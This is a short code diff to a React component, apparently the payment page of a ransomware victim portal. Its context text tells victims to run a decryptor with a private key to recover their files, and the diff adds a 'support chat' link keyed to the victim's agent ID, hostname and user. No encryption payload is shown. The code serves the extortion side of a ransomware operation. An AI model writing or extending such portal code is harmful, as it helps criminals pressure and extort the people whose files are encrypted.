@@ -95,6 +95,7 @@ const UserPay = () => {
                     </Button>
                 </div>
                 <p>To recover your files, please download the private key file and run the rcypt.exe with the file as an argument in a powershell window, exemple: c:/path/to/rcrypt.exe c:/path/to/private_key.pem</p>
+                <p>If you would need help, here's our SUPPORT CHAT: https://cthulhu.hecque.fr/chatuser/{agentID}-{hostname}-{hookUser}</p>
             </form>
         </div>
     )
